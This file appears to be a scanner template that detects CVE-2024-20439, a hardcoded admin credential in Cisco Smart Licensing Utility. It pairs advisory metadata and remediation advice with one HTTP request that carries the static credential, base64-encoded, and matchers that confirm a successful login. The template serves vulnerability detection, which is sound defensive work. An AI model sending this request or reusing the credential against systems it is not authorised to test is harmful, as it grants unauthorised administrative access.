id: CVE-2024-20439

info:
  name: Hardcoded Admin Credentials For Cisco Smart Licensing Utility API
  author: iamnoooob,parthmalhotra,pdresearch
  severity: critical
  description: |
    A vulnerability in Cisco Smart Licensing Utility could allow an unauthenticated, remote attacker to log in to an affected system by using a static administrative credential.This vulnerability is due to an undocumented static user credential for an administrative account. An attacker could exploit this vulnerability by using the static credentials to log in to the affected system. A successful exploit could allow the attacker to log in to the affected system with administrative privileges over the API of the Cisco Smart Licensing Utility application.
  impact: |
    Unauthenticated attackers can log in with administrative privileges using hardcoded credentials to access sensitive API functions and compromise the system.
  remediation: |
    Update Cisco Smart Licensing Utility to a version that removes hardcoded credentials.
  reference:
    - https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cslu-7gHMzWmw
    - https://github.com/fkie-cad/nvd-json-data-feeds
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-20439
    cwe-id: CWE-912
    epss-score: 0.86315
    epss-percentile: 0.99385
  metadata:
    verified: true
    max-request: 1
  tags: cve,cve2024,cisco,smart,licensing,auth-bypass,kev,vkev,vuln

http:
  - raw:
      - |
        GET /cslu/v1/scheduler/jobs HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic Y3NsdS13aW5kb3dzLWNsaWVudDpMaWJyYXJ5NEMkTFU=

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"job_name":'
          - '"current_status":'
        condition: and

      - type: word
        part: content_type
        words:
          - 'application/json'

      - type: status
        status:
          - 200
# digest: 490a0046304402205e18fe00855a3d6657a65910c665594f705601202ccc1bbd4a1934ad19f1dde502200584c61a39d9ff99909b9d584795d871651123610eac1db49fcc2b00059e5bb9:922c64590222798bb761d5b6d8e72950